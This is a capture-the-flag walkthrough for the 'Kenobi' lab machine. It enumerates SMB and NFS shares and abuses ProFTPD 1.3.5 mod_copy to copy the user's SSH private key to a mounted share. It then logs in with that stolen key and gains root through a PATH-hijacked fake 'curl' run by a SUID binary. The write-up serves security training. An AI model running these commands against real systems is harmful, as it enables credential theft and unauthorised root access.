# Kenobi
## IP
```
10.10.216.92
```

## Open ports
7

## Enum samba shares
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.216.92
```

3 found

## connect to anonymous
```bash
smbclient //10.10.216.92/anonymous
```

## download share data recursively
```bash
smbget -R smb://10.10.216.92/anonymous
```

## Enum RPC

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.216.92
```

Found mount `/var`



## ProFTPD
Port: 21
version `1.3.5`

### searchsploit

```bash
searchsploit ProFTPd 1.3.5
```

Found `mod_copy`

### use!
- NetCat to ProFTPD
```bash
nc 10.10.216.92 21
```

- copy is_rsa to public
```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

#### Mount public share to our machine

```bash
mkdir kenobiNFS

sudo mount 10.10.216.92:/var ./kenobiNFS

ls -la /mnt/kenobiNFS
```

**install nfs-common if needed (`mount` error)**
```bash
sudo apt-get install nfs-common
```

## Connect to FTP
#### save id_rsa
```bash
cp kenobiNFS/tmp/id_rsa .
```

#### change id_rsa permissions if ssh does not connect
```bash
chmod -xrw id_rsa
chmod u+rx id_rsa
```

#### connect
```bash
ssh -i id_rsa kenobi@10.10.216.92

```


## FLAG 1
```bash
cat /home/kenobi/user.txt
```


# Privilege escalation
## Find files with SUID bit
```bash
find / -perm -u=s -type f 2>/dev/null
```

#### found potential
`/usr/bin/menu`

### create fake curl from sh for that program
```bash
cd tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

### run it
```bash
/usr/bin/menu
```
## GOT ROOT SHELL!


# FLAG 2
```bash
cat /root/root.txt
```
